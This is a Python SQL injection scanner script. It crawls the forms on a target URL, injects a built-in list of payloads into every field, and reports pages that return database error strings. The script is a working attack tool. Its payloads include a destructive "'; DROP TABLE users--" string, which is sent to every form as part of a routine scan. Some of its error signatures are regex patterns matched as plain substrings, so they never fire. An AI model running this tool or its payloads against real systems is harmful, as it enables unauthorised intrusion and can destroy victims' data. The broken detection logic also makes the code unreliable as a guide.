"""
SQL Injection Scanner
======================
Scans web forms for SQL injection vulnerabilities by submitting
common injection payloads and analysing server error responses.

Use cases : Web application pentesting, vulnerability assessment,
            bug bounty recon, security audits on authorised targets.

Author    : Security Engineer
Usage     : python sql_injection_scanner.py -u <URL> [options]

⚠  Only run against targets you own or have explicit written permission
   to test. Unauthorised scanning is illegal.
"""

import sys
import json
import argparse
import urllib.parse
from datetime import datetime
from typing import Optional

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing dependencies. Run:  pip install requests beautifulsoup4")
    sys.exit(1)


# ─────────────────────────────────────────────
#  ANSI colour helpers
# ─────────────────────────────────────────────

class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"

    _enabled = True

    @classmethod
    def disable(cls) -> None:
        cls._enabled = False
        for attr in ("RESET","BOLD","DIM","RED","GREEN","YELLOW","BLUE","CYAN","WHITE"):
            setattr(cls, attr, "")

def banner() -> None:
    print(f"""
{C.CYAN}{C.BOLD}╔══════════════════════════════════════════════════╗
║         SQL Injection Scanner  v2.0              ║
║   For authorised penetration testing only        ║
╚══════════════════════════════════════════════════╝{C.RESET}
""")

def info(msg: str)    -> None: print(f"{C.BLUE}[*]{C.RESET} {msg}")
def success(msg: str) -> None: print(f"{C.GREEN}[+]{C.RESET} {C.GREEN}{msg}{C.RESET}")
def warn(msg: str)    -> None: print(f"{C.YELLOW}[!]{C.RESET} {C.YELLOW}{msg}{C.RESET}")
def vuln(msg: str)    -> None: print(f"{C.RED}{C.BOLD}[VULN]{C.RESET} {C.RED}{msg}{C.RESET}")
def safe(msg: str)    -> None: print(f"{C.GREEN}[SAFE]{C.RESET} {msg}")
def err(msg: str)     -> None: print(f"{C.RED}[ERR]{C.RESET}  {msg}", file=sys.stderr)


# ─────────────────────────────────────────────
#  SQL error signatures
# ─────────────────────────────────────────────

SQL_ERRORS = {
    # MySQL
    "you have an error in your sql syntax",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "supplied argument is not a valid mysql",
    "com.mysql.jdbc.exceptions",
    # MSSQL
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "incorrect syntax near",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    # Oracle
    "ora-01756",
    "ora-00933",
    "oracle error",
    # PostgreSQL
    "pg_query()",
    "supplied argument is not a valid postgresql",
    "psql error",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite error",
    # Generic
    "sql syntax.*mysql",
    "warning.*mysql_",
    "valid mysql result",
    "mysqlclient.",
    "db2 sql error",
    "sqlstate",
}

# Injection payloads — ordered from least to most aggressive
PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    '" OR 1=1--',
    "'; DROP TABLE users--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(0)--",       # time-based probe (sleep 0 = safe, checks syntax only)
]


# ─────────────────────────────────────────────
#  HTTP session
# ─────────────────────────────────────────────

def make_session(
    user_agent  : Optional[str] = None,
    proxy       : Optional[str] = None,
    timeout     : int = 10,
) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = user_agent or (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) "
        "Gecko/20100101 Firefox/125.0"
    )
    s.headers["Accept"] = (
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    )
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


# ─────────────────────────────────────────────
#  Form extraction
# ─────────────────────────────────────────────

def get_forms(url: str, session: requests.Session, timeout: int) -> list:
    try:
        resp = session.get(url, timeout=timeout)
        soup = BeautifulSoup(resp.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        err(f"Failed to fetch {url}: {e}")
        return []


def form_details(form, base_url: str) -> dict:
    """Extract action, method, and input fields from a BeautifulSoup form tag."""
    action  = form.attrs.get("action", "")
    method  = form.attrs.get("method", "get").lower()

    # Resolve relative action URL
    action = urllib.parse.urljoin(base_url, action) if action else base_url

    inputs = []
    for tag in form.find_all(["input", "textarea", "select"]):
        inputs.append({
            "type" : tag.attrs.get("type", "text").lower(),
            "name" : tag.attrs.get("name"),
            "value": tag.attrs.get("value", ""),
        })
    return {"action": action, "method": method, "inputs": inputs}


# ─────────────────────────────────────────────
#  Vulnerability check
# ─────────────────────────────────────────────

def is_vulnerable(response: requests.Response) -> bool:
    body = response.text.lower()
    for error in SQL_ERRORS:
        if error in body:
            return True
    return False


# ─────────────────────────────────────────────
#  Core scanner
# ─────────────────────────────────────────────

def scan_url(
    url      : str,
    session  : requests.Session,
    timeout  : int,
    payloads : list,
    verbose  : bool,
    stop_first: bool,
) -> list:
    """
    Scan all forms on `url` with each payload.
    Returns a list of finding dicts.
    """
    findings = []
    forms = get_forms(url, session, timeout)

    if not forms:
        warn(f"No forms found on {url}")
        return findings

    info(f"Found {C.BOLD}{len(forms)}{C.RESET} form(s) on {C.CYAN}{url}{C.RESET}")

    for form_idx, form in enumerate(forms, 1):
        details = form_details(form, url)
        target  = details["action"]
        method  = details["method"]

        print(f"\n  {C.DIM}Form {form_idx}/{len(forms)} → {method.upper()} {target}{C.RESET}")

        for payload in payloads:
            # Build submission data
            data: dict = {}
            for inp in details["inputs"]:
                if not inp["name"]:
                    continue
                if inp["type"] in ("hidden",) or inp["value"]:
                    data[inp["name"]] = inp["value"] + payload
                elif inp["type"] not in ("submit", "button", "image", "reset"):
                    data[inp["name"]] = f"test{payload}"

            if verbose:
                print(f"    {C.DIM}Payload: {repr(payload)}{C.RESET}")

            try:
                if method == "post":
                    res = session.post(target, data=data, timeout=timeout)
                else:
                    res = session.get(target, params=data, timeout=timeout)
            except requests.RequestException as e:
                warn(f"Request failed: {e}")
                continue

            if is_vulnerable(res):
                vuln(f"SQL Injection vulnerability detected!")
                print(f"       {C.DIM}URL     : {target}{C.RESET}")
                print(f"       {C.DIM}Method  : {method.upper()}{C.RESET}")
                print(f"       {C.DIM}Payload : {repr(payload)}{C.RESET}")
                print(f"       {C.DIM}Status  : {res.status_code}{C.RESET}")
                findings.append({
                    "url"    : target,
                    "method" : method,
                    "payload": payload,
                    "status" : res.status_code,
                    "form"   : form_idx,
                })
                if stop_first:
                    return findings
                break   # confirmed vulnerable on this form, move to next
            else:
                if verbose:
                    print(f"    {C.GREEN}✓{C.RESET} {C.DIM}Clean — payload: {repr(payload)}{C.RESET}")

    if not findings:
        safe(f"No SQL injection vulnerabilities detected on {url}")

    return findings


# ─────────────────────────────────────────────
#  Report writer
# ─────────────────────────────────────────────

def save_report(
    url      : str,
    findings : list,
    output   : Optional[str],
) -> None:
    safe_url  = urllib.parse.urlparse(url).netloc.replace(".", "_")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    json_file = output or f"sqli_{safe_url}_{timestamp}.json"
    txt_file  = json_file.replace(".json", ".txt")

    payload = {
        "target"   : url,
        "timestamp": datetime.now().isoformat(),
        "findings" : findings,
        "total"    : len(findings),
    }

    # ── JSON ────────────────────────────────
    with open(json_file, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2)
    success(f"JSON report saved → {json_file}")

    # ── TXT ─────────────────────────────────
    with open(txt_file, "w", encoding="utf-8") as fh:
        fh.write("SQL Injection Scan Report\n")
        fh.write("=" * 55 + "\n")
        fh.write(f"Target    : {url}\n")
        fh.write(f"Timestamp : {payload['timestamp']}\n")
        fh.write(f"Findings  : {len(findings)}\n")
        fh.write("=" * 55 + "\n\n")
        if findings:
            for i, f in enumerate(findings, 1):
                fh.write(f"[{i}] VULNERABLE\n")
                fh.write(f"    URL     : {f['url']}\n")
                fh.write(f"    Method  : {f['method'].upper()}\n")
                fh.write(f"    Payload : {f['payload']}\n")
                fh.write(f"    Status  : {f['status']}\n\n")
        else:
            fh.write("No vulnerabilities found.\n")
    success(f"TXT report saved  → {txt_file}")


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────

def build_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="sql_injection_scanner.py",
        description=(
            "SQL Injection Scanner — tests web forms for SQLi vulnerabilities.\n"
            "⚠  Only use against targets you own or have written permission to test."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sql_injection_scanner.py -u http://testphp.vulnweb.com/login.php
  python sql_injection_scanner.py -u http://target.local --method post --verbose
  python sql_injection_scanner.py -u http://target.local --proxy http://127.0.0.1:8080
  python sql_injection_scanner.py -u http://target.local --output report.json --stop-first
        """,
    )

    p.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL to scan",
    )
    p.add_argument(
        "--timeout",
        type=int, default=10,
        metavar="SEC",
        help="HTTP request timeout in seconds (default: 10)",
    )
    p.add_argument(
        "--proxy",
        metavar="URL",
        help="HTTP/S proxy (e.g. http://127.0.0.1:8080 for Burp Suite)",
    )
    p.add_argument(
        "--user-agent",
        metavar="UA",
        help="Custom User-Agent string",
    )
    p.add_argument(
        "--payloads",
        nargs="+",
        metavar="PAYLOAD",
        help="Override default payloads with custom list",
    )
    p.add_argument(
        "--output",
        metavar="FILE",
        help="Output JSON filename (default: sqli_<host>_<timestamp>.json)",
    )
    p.add_argument(
        "--stop-first",
        action="store_true",
        help="Stop scanning after the first vulnerability is found",
    )
    p.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Print each payload attempt",
    )
    p.add_argument(
        "--no-color",
        action="store_true",
        help="Disable ANSI colours",
    )
    return p.parse_args()


# ─────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────

def main() -> None:
    args = build_args()

    if args.no_color:
        C.disable()

    banner()

    session  = make_session(args.user_agent, args.proxy, args.timeout)
    payloads = args.payloads or PAYLOADS

    info(f"Target  : {C.CYAN}{args.url}{C.RESET}")
    info(f"Payloads: {len(payloads)}")
    if args.proxy:
        info(f"Proxy   : {args.proxy}")
    print()

    findings = scan_url(
        url       = args.url,
        session   = session,
        timeout   = args.timeout,
        payloads  = payloads,
        verbose   = args.verbose,
        stop_first= args.stop_first,
    )

    print()
    # ── Summary ───────────────────────────────
    print(f"{C.BOLD}{'=' * 55}{C.RESET}")
    if findings:
        vuln(f"{len(findings)} vulnerability/vulnerabilities found.")
    else:
        success("Scan complete — no SQLi vulnerabilities detected.")
    print(f"{C.BOLD}{'=' * 55}{C.RESET}\n")

    # ── Always save results ───────────────────
    save_report(args.url, findings, args.output)
    print()


if __name__ == "__main__":
    main()